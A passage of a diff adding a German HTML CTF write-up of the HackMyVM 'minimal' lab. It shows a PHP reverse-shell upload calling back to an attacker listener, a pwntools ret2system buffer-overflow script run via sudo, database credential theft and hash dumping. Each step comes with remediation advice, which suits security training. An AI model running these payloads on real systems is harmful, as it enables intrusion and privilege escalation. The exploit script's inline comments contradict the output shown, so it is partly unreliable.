+    *   Verwenden Sie kryptographisch sichere Zufallsgeneratoren (CSPRNG), um lange, nicht vorhersagbare Tokens zu erstellen.
+    *   Speichern Sie einen Hash des Tokens serverseitig (z.B. in der Datenbank) zusammen mit einem Zeitstempel und dem Benutzerbezug.
+    *   Setzen Sie eine kurze Gültigkeitsdauer für die Tokens.
+    *   Invalidieren Sie Tokens nach einmaliger Verwendung.
+    *   Verwenden Sie niemals einfache, sequenzielle oder aus Benutzerdaten abgeleitete Werte zur Token-Generierung.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit den durch den Passwort-Reset-Exploit erlangten Zugangsdaten (`admin`:`patata`) bei `/login.php` anzumelden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">[Kein Prompt - Login-Versuch im Browser oder mit curl/Burp]</div>
+                    <pre>Ziel: http://minimal.hmv/login.php
+Benutzername: admin
+Passwort: patata</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich (impliziert durch den anschließenden Zugriff auf `/admin.php`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Nach dem erfolgreichen Login als `admin` navigieren Sie zu `/admin.php` und untersuchen die dort verfügbaren Funktionen, insbesondere den Dateiupload.
+<br><strong>Empfehlung (Admin):** Stellen Sie sicher, dass das Admin-Konto zusätzlich geschützt ist (z.B. durch Multi-Faktor-Authentifizierung).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als Admin wird die Funktionalität von `/admin.php` untersucht. Diese Seite erlaubt das Hochladen von Produktbildern. Der Angreifer bereitet eine PHP-Reverse-Shell (`rev.php`) vor, indem er die Ziel-IP und den Port anpasst, und lädt diese Datei über das Admin-Panel hoch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">grep "ip\|port" rev.php</span></div>
+                     <pre>
+ $ip = '<span class="command">192.168.2.199</span>';  // CHANGE THIS
+ $port = <span class="command">4444</span>;       // CHANGE THIS
+ </pre>
+                     <div class="prompt">[Kein Prompt - Datei rev.php wird über http://minimal.hmv/admin.php hochgeladen]</div>
+                     <pre>Uploaded</pre> <!-- Erfolgsmeldung der Webseite -->
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Angreifer-System wird ein Netcat-Listener auf dem in `rev.php` konfigurierten Port (4444) gestartet.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>listening on [any] 4444 ...</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer ruft die hochgeladene PHP-Shell über ihren vermuteten Pfad (`/imgs/rev.php`) im Browser oder mit `curl` auf.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Browser-Aufruf oder curl]</div>
+                     <pre><span class="command">http://minimal.hmv/imgs/rev.php</span></pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (Reverse Shell)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Aufruf der hochgeladenen PHP-Datei `rev.php` führt dazu, dass der Server eine Verbindung zum Netcat-Listener des Angreifers aufbaut.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.117] 34272</span>
+Linux minimal 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 23:15:47 up 48 min,  0 users,  load average: 0.12, 0.08, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+/bin/sh: 0: can't access tty; job control turned off
+$</pre> <!-- Shell erhalten -->
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Dateiupload im Admin-Panel war unsicher und erlaubte das Hochladen und Ausführen einer PHP-Datei. Dies führte erfolgreich zu einer Reverse Shell mit den Rechten des Webserver-Benutzers (`www-data`). Dies ist der initiale Zugriff auf das System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Die erhaltene Shell ist eine einfache `/bin/sh`. Stabilisieren Sie die Shell (z.B. mit Python PTY), um eine interaktive Umgebung zu erhalten. Beginnen Sie dann mit der Enumeration als `www-data`, um Wege zur Privilegieneskalation zu finden (`sudo -l`, SUID-Dateien, Cronjobs, etc.).
+<br><strong>Empfehlung (Admin):** Implementieren Sie eine strikte serverseitige Validierung für Dateiuploads:
+    *   Überprüfen Sie den Dateityp (MIME-Type) und die Dateiendung anhand einer Whitelist erlaubter Bildformate.
+    *   Generieren Sie Dateinamen neu, um das Einschleusen von schädlichen Namen zu verhindern.
+    *   Speichern Sie hochgeladene Dateien idealerweise außerhalb des Web-Roots oder in einem Verzeichnis ohne Ausführungsberechtigungen (`AllowOverride None`, keine PHP-Handler für dieses Verzeichnis).
+    *   Prüfen Sie Bilder nach dem Upload auf eingebetteten Code (z.B. mit `exiftool` oder Bildverarbeitungsbibliotheken).</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Buffer Overflow)</h2>
+            <p class="analysis"><strong>Analyse:</strong> In der erhaltenen `www-data`-Shell werden die `sudo`-Berechtigungen überprüft.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@minimal:/tmp$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on minimal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on minimal:
+    <span class="command">(root) NOPASSWD: /opt/quiz/shop</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `www-data` darf das Programm `/opt/quiz/shop` als Root (`(root)`) und ohne Passwort (`NOPASSWD`) ausführen. Dies ist ein sehr wahrscheinlicher Vektor zur Privilegieneskalation, insbesondere wenn das Programm `/opt/quiz/shop` eine Schwachstelle aufweist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Untersuchen Sie das Programm `/opt/quiz/shop`. Handelt es sich um ein Skript oder eine Binärdatei? Kopieren Sie es auf Ihr Angreifer-System und analysieren Sie es auf Schwachstellen (z.B. Command Injection, Path Traversal, Buffer Overflow). Da der Bericht später einen Buffer Overflow Exploit zeigt, liegt der Fokus auf dieser Art von Analyse (z.B. mit `ghidra`, `gdb`).
+<br><strong>Empfehlung (Admin):** Gewähren Sie `sudo`-Rechte nur, wenn absolut notwendig und nur für spezifische, sichere Befehle. `NOPASSWD` sollte extrem selten und nur für nicht-interaktive, gut getestete Skripte verwendet werden. Programme, die mit `sudo` ausgeführt werden dürfen, müssen sorgfältig auf Sicherheitslücken überprüft werden. Das Prinzip der geringsten Rechte anwenden.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Nach der Analyse von `/opt/quiz/shop` (Schritte nicht gezeigt) wurde eine Buffer-Overflow-Schwachstelle identifiziert. Ein Python-Exploit-Skript (`hacker.py`) wird im `/tmp`-Verzeichnis auf dem Zielsystem erstellt (z.B. mit `nano` oder `cat << EOF > hacker.py`). Dieses Skript verwendet die `pwn`-Bibliothek, um einen Exploit für die Schwachstelle zu erstellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@minimal:/tmp$ <span class="command">nano hacker.py</span></div>
+                     <pre>Unable to create directory /var/www/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.</pre>
+                     <div class="prompt">www-data@minimal:/tmp$ <span class="command">cat hacker.py</span></div>
+                     <pre><code class="language-python">
+from pwn import *
+
+# Conectarse al proceso en remoto
+# Korrektur: Ziel ist nicht remote, sondern lokal über den nc-Pipe
+# target = remote('192.168.2.117', 8000) # Falsch im Original
+
+# Gadgets y direcciones importantes (Ermittelt durch Analyse von /opt/quiz/shop)
+system_addr = p64(0x0040124f) # Adresse der system() Funktion (oder eines äquivalenten Gadgets)
+sh_address = p64(0x004021f5)  # Adresse des Strings "/bin/sh" (oder "sh")
+pop_rdi = p64(0x004015dd)     # Adresse eines 'pop rdi; ret' Gadgets
+
+# Creación del payload
+payload = b"A" * 0x78 # Padding (Offset bis zum Return Pointer, ermittelt durch Analyse)
+payload += pop_rdi    # Adresse von 'pop rdi; ret' auf den Stack legen
+payload += sh_address # Adresse von "/bin/sh" auf den Stack legen (wird von pop rdi in RDI geladen)
+payload += system_addr# Adresse von system() auf den Stack legen (wird als Return Adresse verwendet)
+
+# Senden des Payloads an den Prozess (über stdin, wenn ./shop gestartet wird)
+# Annahme: Das Skript wird später angepasst oder anders verwendet,
+# da es hier für eine Remote-Verbindung konfiguriert ist.
+# Für den lokalen Exploit wird der Payload direkt an ./shop gesendet.
+
+# target.sendline(payload)
+# target.interactive() # Nicht anwendbar für den lokalen Exploit über nc-Pipe
+
+# Korrekter Ansatz für den lokalen Exploit wäre, den Payload zu generieren
+# und dann in die nc-Verbindung zu pipen, die zu ./shop führt.
+# Beispiel (Payload Generierungsteil):
+# print(payload)
+
+</code></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Skript definiert die notwendigen Komponenten für einen einfachen Ret2libc- oder Ret2system-Buffer-Overflow-Angriff:
+*   **Padding:** Eine bestimmte Anzahl von Bytes (`A` * 0x78), um den Puffer bis zum gespeicherten Return Pointer auf dem Stack zu füllen.
+*   **`pop rdi; ret` Gadget:** Eine Anweisung aus dem Code des Programms, die den obersten Wert vom Stack in das `RDI`-Register lädt (das erste Argument für Funktionen in der x64-Aufrufkonvention) und dann zurückkehrt (`ret`).
+*   **`/bin/sh` Adresse:** Die Speicheradresse der Zeichenkette "/bin/sh" im Programm.
+*   **`system()` Adresse:** Die Speicheradresse der `system()`-Funktion aus der libc (oder einer äquivalenten Funktion/Gadget im Programm).
+Der Payload ist so aufgebaut, dass nach dem Überlauf `pop rdi` ausgeführt wird, die Adresse von "/bin/sh" in `RDI` lädt und dann `system()` aufgerufen wird, was effektiv `system("/bin/sh")` ausführt und eine Shell startet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Der Exploit-Code ist vorbereitet. Der nächste Schritt ist die Ausführung des Angriffs:
+1.  Starten Sie einen Netcat-Listener auf dem Zielsystem, der seine Standardausgabe an den `sudo ./shop`-Prozess weiterleitet: `nc -lvnp 8000 | sudo /opt/quiz/shop`.
+2.  Führen Sie das Python-Skript (`hacker.py`) so aus, dass der generierte Payload an den Netcat-Listener auf Port 8000 gesendet wird (z.B. `python3 hacker.py | nc localhost 8000` oder das Python-Skript direkt anpassen, um den Payload zu senden).
+<br><strong>Empfehlung (Admin):** Beheben Sie die Buffer-Overflow-Schwachstelle in `/opt/quiz/shop` (z.B. durch Verwendung sicherer Funktionen wie `fgets` statt `gets`, Überprüfung von Längen). Kompilieren Sie das Programm mit Schutzmechanismen wie Stack Canaries, ASLR und NX/DEP. Entfernen Sie die unsichere `sudo`-Regel für dieses Programm.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Buffer Overflow Exploit wird ausgeführt. Auf dem Zielsystem wird `nc` gestartet, um auf Port 8000 zu lauschen. Die eingehenden Daten von `nc` werden über eine Pipe (`|`) an den `/opt/quiz/shop`-Prozess weitergeleitet, der mit `sudo` (also als Root) ausgeführt wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@minimal:/opt/quiz$ <span class="command">nc -lvnp 8000 | sudo ./shop</span></div>
+                     <pre>
+Listening on 0.0.0.0 8000
+Hey guys, I have prepared this little program to find out how much you know about me, since I have been your administrator for 2 years.
+If you get all the questions right, you win a teddy bear and if you don't, you win a teddy bear and if you don't, you win trash
+What is my favorite OS?
+<span class="password">Connection received on 192.168.2.199 33154</span> <span class="comment"><-- Verbindung vom Exploit-Skript</span>
+Nope!! <span class="comment"><-- Normale Ausgabe des Programms, bevor der Overflow zuschlägt</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span> <span class="comment"><-- ID-Ausgabe von der Root-Shell!</span>
+<span class="password">root.txt  snap</span> <span class="comment"><-- ls-Ausgabe von der Root-Shell</span>
+<span class="password">HMV{never_gonna_RP_you_down}</span> <span class="comment"><-- Inhalt von root.txt, von der Root-Shell ausgegeben</span>
+</pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Auf dem Angreifer-System wird das Python-Skript `hacker.py` ausgeführt (wahrscheinlich angepasst, um den Payload an `localhost:8000` oder die Ziel-IP zu senden). Das Skript sendet den präparierten Payload.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">python3 hacker.py</span></div>
+                     <pre>
+[+] Opening connection to 192.168.2.117 on port 8000: Done <span class="comment"><-- Verbindung wird aufgebaut</span>
+[*] Switching to interactive mode <span class="comment"><-- Shell wird interaktiv übergeben?</span>
+$ <span class="command">id</span> <span class="comment"><-- Befehl in der Root-Shell eingegeben</span>
+$ <span class="command">cd /root</span> <span class="comment"><-- Befehl in der Root-Shell eingegeben (impliziert)</span>
+$ <span class="command">ls</span> <span class="comment"><-- Befehl in der Root-Shell eingegeben</span>
+$ <span class="command">cat root.txt</span> <span class="comment"><-- Befehl in der Root-Shell eingegeben</span>
+[*] Got EOF while reading in interactive <span class="comment"><-- Shell beendet sich</span>
+$
+[*] Interrupted
+[*] Closed connection to 192.168.2.117 port 8000
+</pre>
+                     <!-- Zweiter Versuch zeigt die gleichen Befehle -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">python3 hacker.py</span></div>
+                     <pre>
+[+] Opening connection to 192.168.2.117 on port 8000: Done
+[*] Switching to interactive mode
+$ <span class="command">id</span>
+$ <span class="command">cd ~</span> <span class="comment"><-- Wechsel ins Root-Home-Verzeichnis</span>
+$ <span class="command">ls</span>
+$ <span class="command">cat root.txt</span>
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Buffer Overflow Exploit ist erfolgreich! Der über `nc` empfangene Payload überschreibt den Return Pointer von `/opt/quiz/shop`. Die Ausführung wird zu den Gadgets umgeleitet, die `system("/bin/sh")` als Root aufrufen. Die Befehle (`id`, `ls`, `cat root.txt`), die vom Angreifer über die `pwn`-Bibliothek gesendet werden, werden in der resultierenden Root-Shell ausgeführt. Die Ausgabe dieser Befehle erscheint auf dem Terminal des Zielsystems, wo `nc | sudo ./shop` lief. Das Root-Flag `<span class="password">HMV{never_gonna_RP_you_down}</span>` wird erfolgreich ausgelesen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Root-Zugriff wurde erlangt und das Root-Flag gelesen. Der Test ist erfolgreich abgeschlossen. Dokumentieren Sie den Buffer Overflow Exploit und die `sudo`-Fehlkonfiguration.
+<br><strong>Empfehlung (Admin):** Buffer-Overflow-Schwachstelle in `/opt/quiz/shop` beheben. Schutzmechanismen beim Kompilieren aktivieren (ASLR, NX, Stack Canaries). Unsichere `sudo`-Regel entfernen. Überwachen Sie Prozesse, die auf Netzwerkports lauschen (`nc`).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` (aus der Reverse Shell oder nach erneutem Initial Access) wird das Home-Verzeichnis des Benutzers `white` untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@minimal:/opt/quiz$ <span class="command">cd ~</span></div>
+                    <div class="prompt">www-data@minimal:/var/www$ <span class="command">cd /home/</span></div>
+                    <div class="prompt">www-data@minimal:/home$ <span class="command">ls -la</span></div>
+                    <pre>
+total 12
+drwxr-xr-x  3 root  root  4096 Nov  1 21:47 .
+drwxr-xr-x 20 root  root  4096 Nov  1 21:42 ..
+drwxr-xr-x  5 white white 4096 Nov  1 22:16 <span class="command">white</span>
+</pre>
+                    <div class="prompt">www-data@minimal:/home$ <span class="command">cd white/</span></div>
+                    <div class="prompt">www-data@minimal:/home/white$ <span class="command">ls -la</span></div>
+                    <pre>
+total 36
+drwxr-xr-x 5 white white 4096 Nov  1 22:16 .
+drwxr-xr-x 3 root  root  4096 Nov  1 21:47 ..
+lrwxrwxrwx 1 white white    9 Nov  1 21:53 .bash_history -> /dev/null
+-rw-r--r-- 1 white white  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 white white 3797 Nov  1 21:55 .bashrc
+drwx------ 2 white white 4096 Nov  1 21:48 .cache
+drwxrwxr-x 3 white white 4096 Nov  1 21:54 .local
+-rw-r--r-- 1 white white  807 Jan  6  2022 .profile
+drwx------ 2 white white 4096 Nov  1 21:47 .ssh
+-rw-r--r-- 1 white white    0 Nov  1 21:48 .sudo_as_admin_successful
+-rw-rw-r-- 1 white white   34 Nov  1 22:16 <span class="command">user.txt</span>
+</pre>
+                    <div class="prompt">www-data@minimal:/home/white$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">HMV{can_you_find_the_teddy_bear?}</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Überraschenderweise kann der `www-data`-Benutzer das Home-Verzeichnis von `white` betreten und die Datei `user.txt` lesen. Dies deutet auf eine unsichere Berechtigungskonfiguration für das Home-Verzeichnis hin (normalerweise sollte es `drwx------` oder `drwxr-x---` sein, nicht `drwxr-xr-x`). Das User-Flag wird hier gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** User-Flag dokumentieren. Die unsicheren Berechtigungen könnten auch den Zugriff auf andere Dateien im Home-Verzeichnis ermöglichen (z.B. SSH-Keys in `.ssh`, falls lesbar).
+<br><strong>Empfehlung (Admin):** Korrigieren Sie die Berechtigungen für die Home-Verzeichnisse der Benutzer (z.B. `chmod 700 /home/white` oder `chmod 750`, falls Gruppenmitglieder Zugriff benötigen). Standardmäßig sollten Home-Verzeichnisse nicht für "andere" (other) lesbar oder ausführbar sein.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird nach SUID-Dateien auf dem System gesucht.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@minimal:/home/white$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
+      297    129 -rwsr-xr-x   1 root     root       131832 Sep 15 20:13 /snap/snapd/20290/usr/lib/snapd/snap-confine
+      843     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/2015/usr/bin/chfn
+      ... (Viele Standard SUID-Dateien, meist von Snap) ...
+   131902     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
+   131914     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
+   131769     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
+   131970     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
+   132185    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
+   131645     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
+   131948     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
+   131753     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
+   132260     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
+   131639     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
+   132184     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
+   ...
+</pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche listet viele SUID-Dateien auf, die meisten davon sind Standard-Systemdateien oder gehören zu Snap-Paketen. Es wird keine offensichtlich ungewöhnliche oder direkt ausnutzbare SUID-Datei gefunden, die nicht bereits bekannt ist (wie `sudo`). Dieser Weg scheint keine einfache Privilegieneskalation zu ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Obwohl hier nichts Offensichtliches gefunden wurde, ist die Suche nach SUID/SGID-Dateien immer ein wichtiger Schritt. Manchmal können veraltete Versionen von Standard-SUID-Tools ausgenutzt werden.
+<br><strong>Empfehlung (Admin):** Überprüfen Sie regelmäßig SUID/SGID-Berechtigungen auf dem System. Entfernen Sie das SUID/SGID-Bit von Dateien, die es nicht benötigen. Halten Sie das System und alle Pakete aktuell, um bekannte Schwachstellen in SUID-Tools zu vermeiden.</p>
+        </section>
+
+        <section id="database-exploration">
+             <h2>Database Exploration</h2>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird versucht, auf die MySQL-Datenbank zuzugreifen. Zuerst wird die Konfigurationsdatei `config.php` (die zuvor über LFI nur als leer angezeigt wurde, aber jetzt im Dateisystem lesbar ist) ausgelesen, um die Zugangsdaten zu erhalten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@minimal:/var/www/html$ <span class="command">cat config.php</span></div>
+                    <pre><code class="language-php">
+<?php
+$servername = "localhost";
+$username = "<span class="command">shop_admin</span>";
+$password = "<span class="password">Hey-Pls-Dont-Crack-This-Passwd</span>";
+$dbname = "<span class="command">shop</span>";
+
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Verificar la conexión
+if ($conn->connect_error) { // Maskierung: -> zu ->
+    die("Error" . $conn->connect_error); // Maskierung: -> zu ->
+}
+
+// Configurar el juego de caracteres
+$conn->set_charset("utf8"); // Maskierung: -> zu ->
+?>
+</code></pre> <!-- Maskierung: <?php und ?> entfernt -->
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `config.php` enthält die Zugangsdaten für die MySQL-Datenbank: Benutzer `shop_admin` mit dem Passwort `<span class="password">Hey-Pls-Dont-Crack-This-Passwd</span>` für die Datenbank `shop`.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Mit den gefundenen Zugangsdaten wird eine Verbindung zur MySQL-Datenbank aufgebaut.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@minimal:/var/www/html$ <span class="command">mysql -u shop_admin -p</span></div>
+                     <pre>Enter password: <span class="password">[Passwort eingegeben]</span>
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 264
+Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2023, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+</pre>
+                     <div class="prompt">mysql> <span class="command">show databases;</span></div>
+                     <pre>
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| shop               |
++--------------------+
+3 rows in set (0.01 sec)
+</pre>
+                     <div class="prompt">mysql> <span class="command">use shop;</span></div>
+                     <pre>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</pre>
+                     <div class="prompt">mysql> <span class="command">select * from users;</span></div>
+                     <pre>
++----+-------+--------------------------------------------------------------+-------------------+
+| id | user  | pass                                                         | mail              |
++----+-------+--------------------------------------------------------------+-------------------+
+|  1 | <span class="command">admin</span> | <span class="password">$2y$10$TZ.4R86ko/5pkigS80ippi4e.rDuR3x15DtrJTImNId10q2Qh.MK.</span> | admin@admin.admin |
+|  2 | <span class="command">ben</span>   | <span class="password">$2y$10$BAc4mRShqN2phdmlMJ8QBd8no3TmBFboFoG2d7D/SeYFeZLzW.e</span> | ben@hacker.de     |
++----+-------+--------------------------------------------------------------+-------------------+
+2 rows in set (0.00 sec)
+</pre>
+                     <div class="prompt">mysql></div>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Datenbankzugriff ist erfolgreich. In der Datenbank `shop` wird eine Tabelle `users` gefunden. Diese Tabelle enthält Benutzernamen (`admin`, `ben`) und deren Passwort-Hashes (bcrypt-Format, erkennbar am `$2y$`). Diese Hashes könnten potenziell offline mit Tools wie `hashcat` oder `john` geknackt werden, falls die Passwörter schwach sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Kopieren Sie die Passwort-Hashes. Versuchen Sie, sie offline zu knacken. Obwohl der Admin-Zugang bereits über den Passwort-Reset erlangt wurde, könnten die Hashes zusätzliche Informationen liefern oder alternative Zugänge ermöglichen.
+<br><strong>Empfehlung (Admin):** Speichern Sie Datenbank-Passwörter sicher in Konfigurationsdateien (korrekte Berechtigungen, außerhalb des Web-Roots). Verwenden Sie starke, zufällige Passwörter für Datenbankbenutzer. Verwenden Sie für Anwendungsbenutzer immer Hashing-Algorithmen mit Salt (bcrypt ist eine gute Wahl). Schränken Sie die Berechtigungen des Datenbankbenutzers (`shop_admin`) auf das Notwendigste ein (z.B. nur SELECT, INSERT, UPDATE auf bestimmte Tabellen).</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser Abschnitt beschreibt die beiden Hauptwege zur Kompromittierung des Systems: Der erste Weg führt über einen fehlerhaften Passwort-Reset-Mechanismus und einen unsicheren Dateiupload zum Initial Access als `www-data`. Der zweite Weg nutzt eine `sudo`-Fehlkonfiguration und einen Buffer Overflow in einem benutzerdefinierten Programm, um von `www-data` zu Root zu eskalieren.</p>
+
+            <h3>POC Methode 1: Initial Access (Passwort-Reset + RCE)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Vorhersagbare Passwort-Reset-Tokens, unsicherer Dateiupload.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Token-Brute-Force: Finde den gültigen Reset-Token für `admin` durch Testen von Base64(MD5("admin" + Zahl)) für Zahlen 1-100.</li>
+                <li>Passwort ändern: Sende Request an `reset_pass.php?user=admin&token=[GEFUNDENER_TOKEN]&newpass=patata`.</li>
+                <li>Login als Admin: Melde dich bei `/login.php` mit `admin:patata` an.</li>
+                <li>Reverse Shell vorbereiten: Passe IP und Port in `rev.php` an.</li>
+                <li>Listener starten: `nc -lvnp 4444` auf Angreifer-System.</li>
+                <li>Shell hochladen: Lade `rev.php` über `/admin.php` hoch.</li>
+                <li>Shell auslösen: Rufe `http://minimal.hmv/imgs/rev.php` auf.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Reverse Shell als `www-data` auf dem Angreifer-Listener.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Eingehende Verbindung auf dem Netcat-Listener mit `uid=33(www-data)`.</p>
+
+            <h3>POC Methode 2: Privilege Escalation (sudo + Buffer Overflow)</h3>
+             <p class="analysis"><strong>Schwachstellen:</strong> Unsichere `sudo`-Berechtigung für `www-data`, Buffer Overflow in `/opt/quiz/shop`.</p>
+             <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `www-data`.</p>
+             <p class="analysis"><strong>Schritte:</strong></p>
+             <ol>
+                 <li>Buffer Overflow Exploit (`hacker.py`) auf Zielsystem erstellen/kopieren.</li>
+                 <li>Listener auf Ziel starten, der Eingaben an `/opt/quiz/shop` weiterleitet: `cd /opt/quiz; nc -lvnp 8000 | sudo ./shop`</li>
+                 <li>Exploit vom Angreifer-System auslösen, der Payload an Ziel-Port 8000 sendet: `python3 hacker.py` (angepasst für lokalen Exploit)</li>
+             </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Der Exploit überschreibt den Return Pointer, führt `system("/bin/sh")` als Root aus. Die Shell wird interaktiv an das `python3 hacker.py`-Skript übergeben.</p>
+            <p class="analysis"><strong>Beweismittel:</strong> Ausführung von `id` im interaktiven Modus zeigt `uid=0(root)`. Auslesen von `/root/root.txt` ist möglich.</p>
+
+            <p class="evaluation"><strong>Risikobewertung:</strong> Beide Pfade stellen hohe Risiken dar. Der Passwort-Reset-Fehler ermöglicht die Übernahme des Admin-Kontos. Der unsichere Upload erlaubt RCE als `www-data`. Die Kombination aus unsicherer `sudo`-Regel und Buffer Overflow ermöglicht die vollständige Eskalation zu Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Sichere Passwort-Reset-Tokens implementieren. Dateiuploads validieren und sichern. `sudo`-Regeln überprüfen und minimieren. Buffer Overflows durch sichere Programmierung und Compiler-Flags verhindern. Berechtigungen für Home-Verzeichnisse korrigieren. Datenbankzugriffe absichern.
+*   **Pentester:** Beide Pfade dokumentieren. Der Buffer Overflow ist technisch anspruchsvoller. Die LFI und der Passwort-Reset sind gängigere Web-Schwachstellen.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/white/user.txt</div>
+                     <div class="flag-value"><span class="password">HMV{can_you_find_the_teddy_bear?}</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">HMV{never_gonna_RP_you_down}</span></div>
+                 </div>
+             </div>
+        </section>
+  
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 23. November 2023</p> <!-- Datum angepasst -->
+    </footer>
